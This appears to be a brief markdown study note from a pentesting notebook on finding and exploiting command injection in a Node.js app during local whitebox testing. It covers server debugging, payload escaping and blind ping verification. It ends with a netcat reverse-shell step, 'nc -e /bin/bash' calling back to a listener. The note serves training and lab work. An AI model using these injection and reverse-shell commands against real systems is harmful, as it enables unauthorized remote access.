#codereview #command-injection #nodejs #debugging

# Whitebox 101: Command Injection

Local debugging → exploitation of a NodeJS app. Related: [whitebox](whitebox.md) · [command-injection](../Web/command-injection.md) · [shells-payloads](../Tools/shells-payloads.md)

## Local Debugging
```bash
node server.js
```
Run the target server locally.

```bash
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"this is just a test!"}'
```
Send a POST request with JSON to the endpoint.

## Payload Prep
```bash
jq -aR .
```
Safely escape a string for JSON input.

## Blind Verification
```bash
sudo tcpdump -i lo icmp
```
Listen for ICMP while injecting `ping -c 3 127.0.0.1`.

## Remote Shell
```bash
nc -lvnp 1234
```
Start a listener (callback with `nc -e /bin/bash 127.0.0.1 1234`). See [shells-payloads](../Tools/shells-payloads.md).
